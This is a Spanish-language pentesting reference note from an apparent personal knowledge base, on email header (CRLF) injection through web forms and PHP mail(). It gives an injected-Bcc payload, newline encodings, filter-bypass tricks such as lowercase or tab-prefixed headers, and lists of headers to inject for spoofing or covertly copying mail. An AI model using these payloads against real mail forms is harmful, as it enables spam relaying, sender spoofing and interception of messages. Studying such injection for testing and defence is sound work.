---
tipo: meta
aliases:
  - inyección de correo
  - mail() injection
  - email CRLF encodings
tags:
  - meta/referencia
  - dominio/web
---

# Email header inyección - matriz de referencia

> [!info] Referencia pura, no un zettel
> Cómo hacer que el `\r\n` pase al correo y dónde cae. Los payloads de impacto están en [[Email header impacto - matriz de referencia]]; el criterio, en [[MOC - Email header injection]].

## 0. El átomo

Igual que en HTTP: `\r\n` = `%0d%0a` separa cabeceras de correo; `\r\n\r\n` separa cabeceras del cuerpo. Ver [[CRLF inyección - matriz de referencia]] para las codificaciones —son las mismas—.

## 1. Confirmar la inyección

Inyectar un `Bcc` propio en el campo de correo y esperar la copia:

```
email = tubuzon@x.com%0d%0aBcc: atacante@x.com
```

Si llega la copia al `Bcc`, hay inyección. Si no se puede recibir correo, probar con un `Subject` inyectado que se refleje en el asunto del correo recibido.

## 2. Los sinks típicos

| Sink | Cómo se inyecta |
|---|---|
| PHP `mail($to,$sub,$body,$headers)` | El 5º parámetro concatena entrada → clásico |
| `mail()` con `$to` de la entrada | Se inyecta en el destinatario directamente |
| Bibliotecas sin escape de cabeceras | Al concatenar en vez de usar la API |
| SMTP directo con cabeceras armadas a mano | Igual |
| `sendmail` con `-t` leyendo cabeceras del cuerpo | El cuerpo con cabeceras inyectadas |

El de `mail()` es el más común: el cuarto/quinto parámetro son cabeceras adicionales y se arma con `"From: " . $input`.

## 3. Dónde cae la entrada

| El campo va a | Se puede inyectar |
|---|---|
| `To` / destinatario | Destinatarios de más, cuerpo |
| `From` / `Reply-To` | Falsificar remitente, cabeceras, cuerpo |
| `Subject` | Cabeceras de más si no se filtra, cuerpo |
| `Cc` visible | Igual |
| Nombre / mensaje del formulario | A veces al cuerpo directo (no es cabecera) |

Confirmar en cuál cae probando un `Bcc` inyectado en cada campo.

## 4. Codificaciones y bypass

Las mismas que [[CRLF inyección - matriz de referencia]] § 2:

`%0d%0a`   estándar
`%0a`      salto solo — muchos MTA lo aceptan
`%0d`      retorno solo
Doble codificación si hay dos capas de decodificación
Unicode que se normaliza a salto de línea

Específico del correo: algunos filtros bloquean `Bcc` pero no `bcc` (minúsculas) ni `\tBcc` (con tabulación).

## 5. Cabeceras que vale inyectar

| Cabecera | Para |
|---|---|
| `Bcc:` | Copia oculta — exfil, spam |
| `Cc:` | Copia visible |
| `To:` | Destinatario de más |
| `From:` | Falsificar remitente |
| `Reply-To:` | Desviar respuestas |
| `Content-Type:` | Cambiar a HTML o MIME → cuerpo |
| `Subject:` | Reescribir el asunto |
| `MIME-Version:` | Habilitar partes MIME |

## 6. Confirmar sin buzón

Si no se puede recibir la copia:

- Inyectar un `Subject:` y ver si cambia el asunto del correo que sí llega (el propio).
- Inyectar un segundo `To:` con la propia dirección y ver si llega doble.
- Provocar un error del servidor de correo con una cabecera malformada y leerlo en la respuesta.

## 7. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| El `Bcc` no llega | Se filtra `\r\n`, o el campo no va a una cabecera. Probar `%0a` solo |
| El salto se refleja literal en el cuerpo | Cae en el cuerpo, no en cabecera: inyección de cuerpo directa |
| `Bcc` bloqueado | Probar minúsculas, tabulación, u otra cabecera |
| Llega pero sin la cabecera inyectada | El sink escapa; buscar otro campo |
| El `From` inyectado no cambia el remitente | El servidor lo fija; queda la inyección de cuerpo |
| Nada funciona | Biblioteca con escape correcto. Buena mitigación |

## Relacionadas

[[MOC - Email header injection]] · [[Email header impacto - matriz de referencia]] · [[CRLF inyección - matriz de referencia]]
